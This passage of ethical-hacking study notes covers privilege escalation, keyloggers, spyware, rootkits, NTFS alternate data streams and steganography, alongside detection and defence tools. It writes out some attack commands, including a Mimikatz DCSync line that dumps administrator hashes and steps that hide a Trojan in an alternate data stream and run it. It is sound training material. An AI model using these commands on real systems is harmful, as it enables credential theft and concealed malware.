		- The DCSync attack targets selective DCs. Attackers with privileged access and domain replication rights use replication protocols to create a virtual DC. This allows them to request and extract sensitive data, such as NTLM password hashes. With this information, attackers can perform golden ticket attacks, account manipulation, LOTL attacks, and deploy ransomware.
		- Attackers use Mimikatz to perform DCSync attacks. Mimikatz includes a DCSync command that employs the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to mimic the behavior of a legitimate domain controller (DC).
		- Retrieve the NTLM password hashes of an administrator account: mimikatz “lsadump::dcsync /domain:(domain name) /user:Administrator”
	- Privilege Escalation by Abusing Active Directory Certificate Services (ADCS):
		- Active Directory Certificate Services (ADCS) is commonly deployed across the AD environment to manage certificates for applications, users, systems, and other entities within the network.
		- Misconfigured ADCS templates can create critical vulnerabilities that attackers can exploit for malicious activities, such as stealing credentials, escalating privileges, and establishing persistence.
		- Attackers can use tools like Certipy to identify and exploit misconfigured ADCS templates.
		- Certipy : Certipy is an offensive tool used for enumerating and exploiting Active Directory Certificate Services (ADCS).
	- Other Privilege Escalation Techniques:
		- Access Token Manipulation:
			- In Windows operating systems, access tokens determine the security context of a process or thread, including the user's identity and privileges. After a user is authenticated, the system generates an access token, which is used by every process the user executes. The system verifies the access token when a process accesses a secured object.
			- Any Windows user can modify these access tokens, making the process appear to belong to a different user than the one who started it, thus adopting the new token's security context. For example, administrators typically log in as normal users and use the "runas" command to execute tools with elevated privileges. Attackers can exploit this to access other users' tokens or generate spoofed tokens, escalating privileges and performing malicious actions while evading detection.
		- Parent PID Spoofing:
			- Attackers attempt to bypass internal security mechanisms and escalate privileges by spoofing the parent process ID (PPID) of a newly created process. New processes typically inherit their PPID from their parent unless explicitly specified. This can be done by providing a PPID for the new process via the CreateProcess API. The API call includes specific arguments that determine which PPID to use.
			- The PPID can be set to that of system processes like svchost.exe or consent.exe, which are associated with Windows User Account Control (UAC). Attackers exploit these methods to bypass security restrictions on process spawning, evade tools that analyze parent-child relationships, and maintain persistence for privilege escalation.
		- Application Shimming:
			- Windows operating systems use the Windows Application Compatibility Framework, which includes "shims," to ensure compatibility between older and newer versions. For example, shimming allows programs designed for Windows XP to run on Windows 11. Shims act as a buffer between the program and the OS, checking if the program requires access to the shim database and using API hooking to redirect code for compatibility.
			- Shims installed by the default Windows installer (sbinst.exe) are stored at %WINDIR%\AppPatch\sysmain.sdb and in the registry at HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB. Running in user mode, shims can't modify the kernel but can be exploited to bypass UAC, inject malicious DLLs, capture memory addresses, etc. Attackers use these to disable Windows Defender, escalate privileges, install backdoors, and perform other malicious activities.
		- Filesystem Permission Weakness:
			- Many processes in Windows operating systems automatically execute binaries as part of their functionality or to perform specific actions. If the filesystem permissions for these binaries are misconfigured, an attacker can replace the legitimate binary with a malicious one, and the process will execute it.
			- If the process running the binary has elevated permissions, the malicious binary will also execute with those higher privileges, potentially including SYSTEM privileges. Attackers exploit this vulnerability to replace legitimate binaries with malicious ones, enabling privilege escalation. This technique is often used to manipulate Windows service binaries and self-extracting installers.
		- Path Interception:
			- Path interception is a technique where an attacker places a malicious executable in a specific path, causing the application to execute it instead of the legitimate target. Attackers can exploit various flaws or misconfigurations to perform path interception, such as unquoted paths (e.g., service paths and shortcut paths), misconfigured path environment variables, and search order hijacking.
		- Abusing Accessibility Features:
			- Attackers can establish persistence and escalate privileges by embedding and executing malicious code within Windows accessibility features. These features can be activated using key combinations even before a user logs into the system, allowing attackers to manipulate them and gain backdoor access without needing to log in.
			- In a Windows environment, these programs are typically stored in C:\Windows\System32\ and can be triggered by pressing specific keys during system reboot. Attackers can escalate privileges by replacing one of the accessibility features with cmd.exe or by modifying registry entries to launch malicious binaries when the key combination is pressed at the login screen. This technique enables attackers to gain system-level access.
			- Accessibility features abused by attackers:
				- On-screen keyboard: C:\Windows\System32\osk.exe
				- Magnifier: C:\Windows\System32\Magnify.exe
				- Narrator: C:\Windows\System32\Narrator.exe
				- Display switcher: C:\Windows\System32\DisplaySwitch.exe
				- App switcher: C:\Windows\System32\AtBroker.exe
				- Sticky keys: C:\Windows\System32\sethc.exe
		- SID-History Injection:
			- In Windows, a Security Identifier (SID) is a unique value assigned to each user and group account by the domain controller (DC) at the time of creation. Active Directory (AD) accounts can store multiple SID values in the SID-history attribute, which is used when migrating a user from one domain to another.
			- Attackers exploit this feature by injecting the SID of an administrator or equivalent account with higher privileges into the compromised user account's SID-history attribute. This injection can elevate the user's privileges, allowing the attacker to access restricted resources or remote systems. Attackers can also move laterally within the domain by using further techniques, such as accessing remote services, SMB/Windows admin shares, or Windows Remote Management.
		- COM Hijacking:
			- The Component Object Model (COM) is an interface framework in Windows environments that allows one software component to interact with another without being aware of its actual implementation. Attackers exploit COM objects by hijacking valid references and replacing them with their own, allowing them to infect the target system and achieve persistence.
			- This process involves modifying or replacing object references with malicious content in the Windows Registry. When a user executes the commonly used object, the malicious code is automatically triggered, enabling the attacker to maintain persistence and potentially escalate privileges associated with the object.
			- COM hijacking techniques:
				- Exploiting the registry loading process by creating a malicious user object under the HKEY_CURRENT_USER\Software\Classes\CLSID\ registry key, which is loaded by the system before the HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\ registry key.
				- Interchanging legitimate DLLs or executable names with malicious payloads, causing the payloads to execute when the legitimate DLLs or executables are run.
				- Exploiting orphaned requests made by system components that are not yet defined in the registry, creating malicious COM objects for those requests in the HKEY_CURRENT_USER registry and mapping them to malicious payloads hidden in the file system.
		- Scheduled Tasks in Windows:
			- Scheduled tasks allow users to automate routine tasks on a computer. Windows includes utilities such as at and schtasks. A user with administrator privileges can use these utilities, along with Task Scheduler, to schedule programs or scripts to run at specific dates and times. If the user provides proper authentication, they can also schedule tasks remotely using Remote Procedure Call (RPC).
			- Attackers can exploit this technique to execute malicious programs at system startup, maintain persistence, perform remote execution, escalate privileges, etc.
		- Scheduled Tasks in Linux:
			- Linux utilizes cron or crond, an instruction-based utility, for automating task scheduling. Attackers exploit this utility to trigger malicious payloads when a specific task is scheduled for execution. The scheduler allows users with administrator privileges to configure cron jobs and execute them at specified times. cron runs commands from the crontab file, typically located at /etc/crontab.
			- Attackers can escalate privileges by modifying scripts executed by cron in /etc/crontab. By altering these scripts, attackers can ensure malicious code is executed automatically during system reboot, potentially gaining root privileges.
		- Launch Daemon:
			- During the macOS boot process, launchd is executed to complete the system initialization. It loads parameters for each launch-on-demand system-level daemon found in /System/Library/LaunchDaemons and /Library/LaunchDaemons. These daemons have associated property list files (plists), which are linked to executables that run during boot.
			- Attackers can create and install a new launch daemon configured to execute at boot time by using launchd or launchctl to load plists into the appropriate directories. Weak configurations may allow attackers to alter the executable of an existing launch daemon, enabling them to maintain persistence or escalate privileges.
		- Plist Modification:
			- In macOS, plist (property list) files contain all the necessary information to configure applications and services. These files specify when programs should execute, the executable file path, program parameters, essential OS permissions, etc. Plist files are stored in specific locations, such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with user-level privileges).
			- Attackers can access and modify these plist files to execute malicious code on behalf of a legitimate user, using them as a persistence mechanism and to escalate privileges.
		- Setuid and Setgid:
			- In Linux and macOS, when an application uses the setuid or setgid flags, the application executes with the privileges of the owning user or group, respectively. Normally, applications run under the current user’s privileges. However, there are situations where programs need to be executed with elevated privileges, even though the user running the program does not require them.
			- In such cases, the setuid or setgid flags can be set for the application. An attacker can exploit applications with the setuid or setgid flags to execute malicious code with elevated privileges.
		- Web Shell:
			- A web shell is a web-based script that provides access to a web server. Web shells can be created on various operating systems, including Windows, Linux, and macOS. Attackers use web shells to inject malicious scripts onto a web server, enabling them to maintain persistent access and escalate privileges. A web shell acts as a backdoor, allowing attackers to gain access and control over a remote server.
			- Typically, a web shell runs under the current user’s privileges. Using a web shell, an attacker can escalate privileges by exploiting local system vulnerabilities. Once privileges are escalated, the attacker can install malicious software, modify user permissions, add or remove users, steal credentials, read emails, etc.
		- Abusing Sudo Rights:
			- Sudo (substitute user do) is a UNIX and Linux-based system utility that allows users to run commands as a superuser or root, using the security privileges of another user. The /etc/sudoers file contains the configuration for sudo rights, detailing access permissions, including which commands can be run with or without a password, for each user or group.
			- Attackers can exploit sudo to escalate their privileges and run programs that normal users are not authorized to execute. For example, if an attacker has sudo rights to run the cp command, they could overwrite the /etc/sudoers or /etc/shadow files with their own malicious files. By modifying the content of the sudoers file, the attacker could alter permissions to run restricted commands or programs, enabling further attacks on the system.
		- Abusing SUID and SGID Permissions:
			- Set User Identification (SUID) and Set Group Identification (SGID) are access permissions assigned to program files in UNIX-based systems. These permissions allow users to execute a program with temporarily elevated or root privileges in order to perform a specific task. Files with SUID and SGID rights run with higher privileges than those of the user running the program.
			- In Linux, certain commands and binaries can be exploited by attackers to escalate their privileges from non-root users to root, if the SUID and SGID flags are set. Some of the executable commands that attackers can use to spawn a shell and escalate privileges include nmap, vim, less, more, bash, cat, cp, echo, find, nano, and others.
			- Find SUID and SGID files in the target system:
				- Find SUID: find / -perm -u=s -type f 2>/dev/null
				- Find GUID: find / -perm -g=s -type f 2>/dev/null
		- Kernel Exploits:
			- Kernel exploits refer to programs that take advantage of vulnerabilities in the kernel to execute arbitrary commands or code with elevated privileges. By successfully exploiting these kernel vulnerabilities, attackers can gain superuser or root-level access to the target system. To execute a kernel exploit, attackers typically need specific configuration details of the target system.
			- OS, kernel version, and architecture of the target system:
				- OS: cat /etc/issue
				- Kernel version: uname -a
				- Architecture: cat /proc/version
			- Detect kernel exploits for escalating privileges: www.exploit-db.com -> linprivchecker.py
		- Abusing '.' in the Path:
			- Adding . to the PATH allows users to execute binaries or scripts from the current directory. While convenient, this practice poses a security risk. If an attacker gains access to a system where a privileged user runs scripts from various directories, they can manipulate the PATH to include a malicious directory.
			- For example, by placing a malicious script named ls in the attacker-controlled directory, the system will execute it instead of the legitimate ls command. This enables the attacker to run arbitrary commands, potentially escalating privileges if the user has elevated permissions.
		- Abusing Elevation Control Mechanism on macOS:
			- Attackers may exploit the AuthorizationExecuteWithPrivileges API for privilege escalation. This API is designed to allow developers to perform operations requiring root privileges, such as software installation or updates. However, it lacks proper validation to verify whether root access requests come from a trusted source.
			- Attackers can exploit this vulnerability to gain root privileges, enabling them to install malicious software and establish persistence on victim systems. When this API is invoked, the user is prompted for their credentials without any verification of the program’s source or integrity. Additionally, the program using the API may load world-writable files, which can be modified by attackers to execute malicious actions with elevated privileges.
		- Process Injection via Ptrace System Calls:
			- Attackers may exploit the ptrace (process trace) system call to inject malicious code into running processes, allowing them to evade process-based defenses and potentially escalate privileges. The ptrace system call enables attackers to debug a process, monitoring and manipulating its memory and register values.
			- Typically, ptrace injection involves writing arbitrary code into a running process (e.g., using malloc) and then using PTRACE_SETREGS to set the register that contains the next instruction to execute. Alternatively, attackers can use PTRACE_POKETEXT or PTRACE_POKEDATA to copy data into specific addresses in the target process's memory, such as the address of the next instruction to execute.
		- Abusing Microsoft Software Installer (MSI):
			- In Windows, MSI files act as databases that contain the dependencies and instructions necessary for installing and removing software. They also allow developers to execute additional scripts during installation, removal, or repair through Custom Actions. During software installation, MSI files are stored in the C:\Windows\Installer directory with randomized names and a .msi extension.
			- This setup enables regular users to use the "repair" functionality to fix issues like missing files, broken shortcuts, invalid registry entries, and other malfunctions. When invoked, the "repair" process can trigger critical actions, including file creation and execution, under the NT AUTHORITY\SYSTEM account, even when initiated by a standard user.
			- If not properly managed, this can pose significant risks. Poorly configured Custom Actions running as NT AUTHORITY\SYSTEM can be exploited by attackers to elevate privileges. Misconfigurations may allow file operations in directories writable by standard users, enabling attackers to modify files used by NT AUTHORITY\SYSTEM and execute arbitrary code, ultimately escalating their privileges.
		- Abusing Windows Filtering Platform (WFP) - NoFilter Attack:
			- The NoFilter attack is a privilege escalation technique that exploits the Windows Filtering Platform (WFP) on Windows 11 systems to gain system-level privileges. This method allows attackers to infiltrate deep into the operating system, run malicious child processes, execute malware with NT AUTHORITY\SYSTEM privileges, or even impersonate other logged-in users to maintain persistence without detection.
			- In this attack, the attacker first identifies the BfeRpcOpenToken method in the WFP by invoking WinAPI through RPC mapping using tools like RPC Mapper. The attacker then exploits the WFP to retrieve a handle to the access token of another process with system-level privileges from the NT handle table. After obtaining the handle to the targeted access token, the attacker uses it to create a copy of the token.
			- Methods for duplicating the acquired access token without triggering detection:
				- Token duplication via WfpAle component : This involves calling the WfpAleProcessTokenReference method in Windows, which causes the TCP/IP driver to duplicate the token and store it in the hash table. The LUID returned by the driver can be used to retrieve the duplicated access token.
				- Token duplication via IPsec connection : This method involves manipulating a user service to create an IPsec connection with the TCP/IP driver, which then duplicates the token and stores it in the hash table. Since the LUID of the token is not returned in this process, the token can only be retrieved by brute-forcing the LUID, which ranges from 1 to 4096.
			- Once the token is duplicated, the attacker can escalate privileges and perform high-level operations on the system, including duplicating tokens from services like LSM, Schedule, and Winmgmt.
- Privilege Escalation Tools
	- BeRoot : Post-exploitation tool designed to identify common misconfigurations that could lead to privilege escalation, focusing solely on potential escalation paths without performing any exploitation or comprehensive system assessment.
	- pwncat : Pwncat is a command and control framework that enhances a basic reverse or bind shell by providing raw terminal access, automated enumeration, file transfer, persistence installation, and privilege escalation capabilities, turning it into a fully-featured exploitation platform.
	- linpostexp : Linux post exploitation enumeration and exploit checking tools (github.com/reider-roque/linpostexp)
	- traitor : Automated Linux privilege escalation tool that exploits common misconfigurations and vulnerabilities, such as gtfobins, pwnkit, dirty pipe, and vulnerable +w docker.sock permissions, to quickly escalate privileges and gain a root shell.
	- PEASS-ng : Privilege Escalation Awesome Scripts - Next Generation is a collection of post-exploitation tools designed to aid in privilege escalation on Windows and Linux systems. It automates the discovery of potential privilege escalation vectors by scanning for misconfigurations, vulnerable services, weak permissions, and known exploits, providing detailed information and scripts to escalate privileges.
	- Windows Exploit Suggester : This tool compares a target's patch levels against the Microsoft vulnerability database to detect potential missing patches. It also notifies the user if public exploits or Metasploit modules are available for the missing bulletins.
	- PowerSploit : PowerShell Post-Exploitation Framework that is a collection of Microsoft PowerShell modules that aid penetration testers during all phases of an assessment
	- FullPowers : Proof-of-Concept tool I made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
- Tools for Defending against DLL and Dylib Hijacking
	- Dependency Walker : Scans Windows modules, builds a dependency tree, lists exported functions, and helps troubleshoot issues like missing modules, import/export mismatches, and initialization failures.
	- Dylib Hijack Scanner : Dylib Hijack Scanner (DHS) is a utility that scans the computer for applications that are either susceptible to dylib hijacking or have been hijacked.
	- DLL Hijack Audit Kit : A toolkit that detects applications vulnerable to DLL hijacking (released in 2010).
	- DLLSpy : A tool that detects DLL hijacking in running processes, services, and their binaries.
	- InSpectre : Examine and understand the hardware and software capabilities of any Windows system to prevent Meltdown and Spectre attacks.
	- Spectre & Meltdown Checker : A shell script to assess a system's resilience against the various transient execution CVEs published since early 2018 and provide guidance on how to mitigate them.


## Maintaining Access
Use Different Techniques to Conceal Malicious Programs and Maintain Remote Access to the System.

- Executing Applications
	- When attackers execute malicious applications remotely on a victim’s machine, it is referred to as "owning" the system, enabling them to gather information for exploitation or privacy breaches, gain unauthorized access to system resources, exfiltrate data, capture screenshots, and install backdoors for sustained access.
	- Malicious Programs Executed by Attackers on Target Systems:
		- Backdoors
		- Crackers
		- Keyloggers
		- Spyware
	- Remote Code Execution Techniques:
		- Exploitation for Client Execution:
			- Web-Browser-Based Exploitation
			- Office-Applications-Based Exploitation (MS Office, Email Applications)
			- Third-Party Applications-Based Exploitation (Adobe Reader, Flash, etc.)
		- Service Execution
			- System services are backend programs in an OS. Attackers exploit them by running binaries or commands that interact with tools like the Service Control Manager, creating or modifying services to escalate privileges or maintain access.
		- Windows Management Instrumentation (WMI)
			- WMI, a Windows feature, manages system resources locally and remotely. Attackers exploit it to access systems, gather data, and execute code to maintain access.
		- Windows Remote Management (WinRM)
			- WinRM is a Windows protocol that enables users to run executable files and modify system services or the registry on remote systems. Attackers exploit WinRM to execute payloads and facilitate lateral movement.
	- Tools for Executing Applications:
		- Dameware Remote Support - Solarwinds
		- Ninja : A privilege escalation detection and prevention system for GNU/Linux hosts
		- Pupy : Open-source, cross-platform remote administration tool (RAT) and post-exploitation framework that executes in memory, leaves a low footprint, and supports multiple communication transports and process migration
		- PsExec : PsExec is a lightweight telnet-replacement utility that allows an attacker to execute processes on remote systems with full interactivity, without needing to install client software on the remote machines.
	- Keyloggers
		- Types of Keystroke Loggers:
			- Hardware Keylogger
				- PC/BIOS Keylogger
				- Keylogger Keyboard
				- External Keylogger
					- PS/2 and USB Keylogger
					- Acoustic/CAM Keylogger
					- Bluetooth Keylogger
					- Wi-Fi Keylogger
			- Software Keylogger
				- Application Keylogger
				- Kernel/Rootkit/Device Driver Keylogger
				- Hypervisor-based Keylogger
				- Form Grabbing Based Keylogger
				- JavaScript Based Keylogger
				- Memory Injection Based Keylogger
		- Keyloggers:
			- KeyGrabber (www.keydemon.com) - HW
			- KeyGrabber USB (www.keelog.com) - HW
			- KeyCarbon (www.keykatcher.com) - HW
			- Keyboard logger (www.detective-store.com) - HW
			- KeyGhost (www.keyghost.com) - HW
			- KEYKatcher (keykatcher.com) - HW
			- Spyrix Personal Monitor (www.spyrix.com) - SW Windows
			- REFOG Personal Monitor (www.refog.com) - SW Windows
			- All In One Keylogger (www.relytec.com) - SW Windows
			- Revealer Keylogger Pro (www.logixoft.com) - SW Windows
			- NetBull (www.netbull.com) - SW Windows
			- Spytector (www.spytector.com) - SW Windows
			- Hoverwatch (www.refog.com) - SW Mac
			- Spyrix Keylogger for Mac (www.spyrix.com) - SW Mac
			- CleverControl (clevercontrol.com) - SW Mac
			- FlexiSPY (www.flexispy.com) - SW Mac
			- KidLogger (kidlogger.net) - SW Mac
			- Perfect Keylogger for Mac (www.blazingtools.com) - SW Mac
	- Spywares
		- Types of Spyware:
			- Desktop Spyware
			- Email Spyware
			- Internet Spyware
			- Child-Monitoring Spyware
			- Screen-Capturing Spyware
			- USB Spyware
			- Audio Spyware
			- Video Spyware
			- Print Spyware
			- Telephone/Cellphone Spyware
			- GPS Spyware
		- Spyware Tools:
			- Spytech SpyAgent (www.spytech-web.com)
			- Spyrix Personal Monitor (www.spyrix.com)
			- CurrentWare (www.currentware.com)
			- FlexiSPY (www.flexispy.com)
			- NetVizor (www.netvizor.net)
			- SoftActivity Monitor (www.softactivity.com)
			- SoftActivity TS Monitor (www.softactivity.com)
			- USB Monitor (www.hhdsoftware.com)
			- USBDeview (www.nirsoft.net)
			- Advanced USB Port Monitor (www.aggsoft.com)
			- Free USB Analyzer (freeusbanalyzer.com)
			- TheOneSpy (www.theonespy.com)
			- Snooper (www.snooper.se)
			- iSpy (www.ispyconnect.com)
			- Perfect IP Camera Viewer (www.perfect-surveillance.com)
			- Optiview VMS (optiviewusa.com)
			- Eyeline Video Surveillance Software (www.nchsoftware.com)
			- mSpy (www.mspy.com)
			- XNSPY (xnspy.com)
			- iKeyMonitor (ikeymonitor.com)
			- ONESPY (onespy.in)
			- Highster Mobile (www.highstermobiles.com)
			- SPYERA (spyera.com)
			- Snoopza (snoopza.com)
			- MobiStealth (www.mobistealth.com)
			- FlexiSPY (www.flexispy.com)
			- Mobile Tracker Free (mobile-tracker-free.com)
	- Anti-Keyloggers (Anti-Keystroke Loggers)
		- Zemana AntiLogger (zemana.com)
		- GuardedID (www.guardedid.com) 
		- KeyScrambler (www.qfxsoftware.com) 
		- Oxynger KeyShield (www.oxynger.com) 
		- Ghostpress (schiffer.tech) 
		- SpyShelter (www.spyshelter.com)
	- Anti-Spyware
		- SUPERAntiSpyware (www.superantispyware.com)
		- Kaspersky Total Security 20 (support.kaspersky.com) 
		- SecureAnywhere Internet Security Complete (www.webroot.com) 
		- Avast One (www.avast.com) 
		- MacScan 3 (www.securemac.com) 
		- Malwarebytes (www.malwarebytes.com)
- Hiding Files
	- Rootkits
		- A rootkit is a stealthy malware program that enables attackers to gain and maintain unauthorized root-level access to a system while hiding their presence and malicious activities by modifying operating system components and utilities.
		- System hooking is the process of modifying and replacing the original function pointer with one provided by the rootkit in stealth mode. Inline function hooking is a technique in which a rootkit modifies some of the bytes of a function within core system DLLs (such as kernel32.dll and ntdll.dll), inserting an instruction so that any process calls are directed to the rootkit first.
		- Types of Rootkits:
			- Hypervisor-Level Rootkit : Hypervisor-level rootkits exploit hardware features like Intel VT and AMD-V to run in Ring-1, hosting the target OS as a virtual machine and intercepting all its hardware calls by altering the boot sequence to load themselves instead of the original virtual machine monitor.
			- Hardware/Firmware Rootkit : Hardware or firmware rootkits embed persistent malware in hardware components like the BIOS, hard drive, or network card, evading detection by hiding in firmware, which is rarely inspected for code integrity.
			- Kernel-Level Rootkit : A kernel-level rootkit operates in Ring-0 with the highest OS privileges, modifying kernel code or adding malicious code via device drivers (Windows) or loadable kernel modules (Linux). These rootkits are hard to detect, can destabilize the system if buggy, and can intercept or manipulate OS operations.
			- Boot-Loader-Level Rootkit : Boot-loader-level rootkits, or bootkits, operate by modifying or replacing the legitimate boot loader, allowing them to activate before the OS starts.
			- Application-Level/User-Mode Rootkit : An application-level/user-mode rootkit runs in Ring-3 alongside other applications, exploiting API behavior to replace standard application files (application binaries) or modify existing applications with patches or injected malicious code.
			- Library-Level Rootkits : Library-level rootkits operate high in the OS, patching, hooking, or replacing system calls with backdoor versions to conceal the attacker’s presence by hiding information.
			- Memory Rootkits : Memory rootkits, or volatile rootkits, are malware that reside solely in a system's RAM, leaving no traces on disk. Unlike traditional rootkits, they operate entirely in volatile memory, making them more elusive and harder to detect.
		- Rootkit Softwares:
			- FudModule Rootkit : The FudModule Rootkit exploits a zero-day admin-to-kernel vulnerability in the Windows AppLocker driver (appid.sys) and employs DKOM techniques to bypass various kernel security mechanisms, thereby gaining kernel-level access. (decoded.avast.io)
			- Fire Chili Rootkit : The Fire Chili rootkit is a sophisticated malware that exploits the Log4Shell vulnerability to enable espionage and data exfiltration. Operating at the kernel level, it allows attackers to intercept, modify, or hide system calls, processes, and network connections, providing long-term remote control and data theft capabilities. (www.fortinet.com)
			- CopperStealer : CopperStealer is a type of malware designed to steal sensitive information from infected systems, primarily focusing on credentials such as login details, cookies, and saved passwords from web browsers. The CopperStealer rootkit is a variant of the CopperStealer malware that incorporates rootkit functionalities. It not only steals sensitive information like login credentials, cookies, and cryptocurrency wallet data but also uses rootkit techniques to hide its presence on the infected system.
			- Syslogk : The Syslogk rootkit is a sophisticated piece of malware targeting Linux systems, designed to operate covertly and evade detection. It installs itself as a kernel module, allowing it to intercept and manipulate system logs, effectively concealing its presence and activities. Syslogk enhances its stealth by removing its own entry from the list of installed kernel modules, making it challenging for system administrators to detect.
			- Adore-Ng Rootkit : The Adore-Ng rootkit is a Linux-based rootkit originally developed as an open-source tool to conceal the presence of malicious software and activities on a compromised system. It is an enhanced version of the Adore rootkit. Operating at the kernel level, Adore-Ng allows attackers to intercept and modify critical system operations, making it difficult for security tools and system administrators to detect.
			- Stealthy Universal Rootkit : The Stealthy Universal Rootkit (SUR) is a covert and versatile rootkit targeting multiple operating systems, including Windows, Linux, and macOS. Operating at the kernel level, it manipulates system processes and files while evading detection using advanced techniques. SUR ensures persistent access, allowing attackers to remotely control the system, exfiltrate data, and install additional malware, all while remaining hidden from security tools.
			- Reptile Rootkit : The Reptile rootkit is a Linux-based rootkit that operates at the kernel level, allowing attackers to gain persistent control over a system while remaining hidden. It uses advanced stealth techniques to conceal files, processes, and network connections, making it difficult to detect and remove, while providing remote access to compromised systems.
			- CosmicStrand : The CosmicStrand rootkit is a UEFI-based rootkit that infects a computer's firmware, giving attackers deep, persistent control over the system. It operates below the OS level, evading detection by security software and surviving OS reinstallation. This rootkit allows remote control, data theft, and the installation of additional malware, making it a significant security threat.
		- Rootkit Detection Techniques :
			- Integrity-Based Detection : Integrity-based detection serves as an alternative to both signature and heuristic-based detection. Tools like Tripwire and AIDE are initially run on a clean system to create a baseline of system files, which are stored in a database. The detection process compares the current filesystem, boot records, or memory snapshot with the trusted baseline, identifying malicious activity by detecting differences between the two.
			- Signature-Based Detection : Signature-based detection identifies rootkits by comparing system processes and files to a database of known rootkit fingerprints. It scans system files and kernel memory to detect malicious programs, including hidden rootkits. However, its effectiveness is limited, as rootkits often hide files or interrupt detection software’s execution path.
			- Heuristic/Behavior-Based Detection : Heuristic-based detection identifies rootkits by recognizing deviations in normal system behavior, also known as behavioral detection. It can detect new, unknown rootkits by spotting irregularities, such as execution path hooking, that differ from standard system patterns.
			- Runtime Execution Path Profiling : Runtime execution path profiling compares the execution paths of system processes and files. Rootkits destabilize routines by adding new code to the execution path. This method hooks instructions before and after routines, as they may differ significantly.
			- Cross-View-Based Detection : Cross-view-based detection assumes the OS has been subverted and enumerates system files, processes, and registry keys using common APIs. It compares this data with a dataset gathered through an algorithm that avoids manipulation. This method relies on the fact that API hooking or kernel manipulation taints the data returned by the OS, allowing for detection of tampered information.
			- Alternative Trusted Medium : The alternative trusted medium technique is a reliable method for detecting rootkits. It involves shutting down the infected system, booting from trusted media like a USB drive, and scanning the OS storage for rootkit traces, which can then be removed to restore the system.
			- Analyzing Memory Dumps : Memory dump analysis involves dumping and analyzing the system's volatile memory (RAM) to detect rootkits. It captures a snapshot of the entire system, process, or kernel, enabling offline forensic analysis. Specialized hardware may be needed to create the memory dump.
			- Virtualization-Based Analysis : Virtualization-based analysis uses introspection techniques to monitor guest operating systems for virtual rootkit activity. Security solutions run within the hypervisor to detect and mitigate virtual rootkits.
		- Anti-Rootkits:
			- GMER (www.gmer.net)
			- Stinger (www.trellix.com)
			- Avast One (www.avast.com)
			- TDSSKiller (usa.kaspersky.com)
			- Malwarebytes Anti-Rootkit (www.malwarebytes.com)
			- AVG Rootkit Scanner (www.avg.com)
	- NTFS Data Stream
		- The NTFS filesystem stores files using two primary data streams: the first holds the security descriptor, such as file permissions, and the second contains the actual file data. Alternate Data Streams (ADS), a feature of NTFS, attach additional data to a file without altering its size, functionality, or visibility in file-browsing utilities. ADS stores metadata such as file attributes, timestamps, and word count and can also be used to embed additional data or malicious code. By forking data into existing files, ADS remains undetected in standard file inspection and provides attackers with a method to hide malicious code, rootkits, or hacker tools. This enables the execution of malicious content without detection by users or system administrators.
		- NTFS data streams allow attackers to hide files undetectable by standard file explorers or security software, as explorers only display root files and ignore linked streams. If a virus embeds itself in an ADS, it remains hidden, as users and default operations interact only with the main data stream.
		- Create NTFS Streams:
			- Open Notepad: notepad myfile.txt:lion.txt
			- Click ‘Yes’ to create the new file, enter some data, and save it
			- View the file size of myfile.txt—it should show as zero
			- The same command can be used to view or modify hidden stream data
		- NTFS Stream Manipulation:
			- Hiding Trojan.exe (Malicious Program) in Readme.txt (Stream):
				- Move the contents of Trojan.exe into an alternate data stream of Readme.txt:
					- c:\> type c:\Trojan.exe > c:\Readme.txt:Trojan.exe
					- The type command hides a file in an alternate data stream (ADS) associated with an existing file. The colon (:) operator is used to specify and create or access the ADS.
			- Creating a Link to the Trojan.exe Stream in the Readme.txt File:
				- After hiding the Trojan.exe file within the Readme.txt file's stream, create a symbolic link to launch Trojan.exe directly from the stream. This provides a shortcut to access the hidden stream.
					- C:\> mklink backdoor.exe Readme.txt:Trojan.exe
			- Executing the Trojan:
				- C:\>backdoor.exe
		- NTFS Streams Detector:
			- Tripwire File Integrity Manager - file integrity checker
			- EventSentry SysAdmin Tools - manipulate hidden streams
			- adslist.exe - manipulate hidden streams
			- Sysinternals’ Streams Utility - identifying and analyzing ADS within system
			- Stream Armor (securityxploded.com)
			- LADS (www.aldeid.com)
			- Stream Detector (www.novirusthanks.org)
			- GMER (www.gmer.net)
			- ADS Scanner (www.pointstone.com)
			- Streams (learn.microsoft.com)
			- AlternateStreamView (www.nirsoft.net)
	- Steganography
		- Steganography is a technique for hiding a secret message within an ordinary message, such as embedding data in a graphic image, to maintain data confidentiality. It is commonly used by attackers to conceal sensitive information, including lists of compromised servers, source code for hacking tools, or plans for future attacks.
		- Steganography hides the existence of a message by replacing bits of unused data in ordinary files, such as graphics, sound, text, audio, or video, with hidden information. The concealed data can take the form of plaintext, ciphertext, or even another image.
		- Classification of Steganography:
			- Technical : Technical steganography employs physical or chemical methods, such as invisible ink, microdots, and computer-based techniques, to conceal the existence of a message. Examples include invisible ink, microdots, and computer-based methods.
				- Computer-based Steganography Techniques:
					- Substitution Techniques : In this technique, the attacker encodes secret information by replacing insignificant bits with the hidden message. If the receiver knows the locations where the secret information is embedded, they can extract the hidden message.
					- Transform Domain Techniques : The transform domain technique hides information in significant parts of the cover image, such as during cropping, compression, or other image processing operations, making it more resistant to attacks. Transformations can be applied either to specific blocks of the image or to the entire image.
					- Spread Spectrum Techniques : This technique is less susceptible to interception and jamming. It involves communication signals occupying more bandwidth than necessary to transmit the information. The sender increases the bandwidth using a code independent of the data, while the receiver employs synchronized reception with the same code to extract the information from the spread spectrum signal.
					- Statistical Techniques : This technique leverages “1-bit” steganography schemes by modifying the cover so that transmitting a “1” significantly alters certain statistical characteristics. When no transmission occurs, the cover remains unchanged, allowing differentiation between modified and unmodified covers. The extraction process relies on hypothesis testing from mathematical statistics.
					- Distortion Techniques : In this technique, the user applies a series of modifications to the cover to create a stego-object, with the modifications representing the transformation of a specific message. Decoding requires knowledge of the original cover, allowing the receiver to measure the differences between the original and the received cover to reconstruct the sequence of modifications.
					- Cover Generation Techniques : In this technique, digital objects are specifically designed to serve as covers for secret communication. The information is encoded in a way that ensures the creation of a suitable cover for concealing the secret message.
			- Linguistic : This type of steganography conceals a message within the carrier of another file, often utilizing text-based or language-driven methods.
				- Semagram : Semagrams are a steganography technique that conceals information using signs or symbols. In this method, the user embeds objects or symbols within the data, altering its appearance to convey a predetermined meaning.
					- Visual Semagram : This technique conceals information within drawings, paintings, letters, music notes, or symbols.
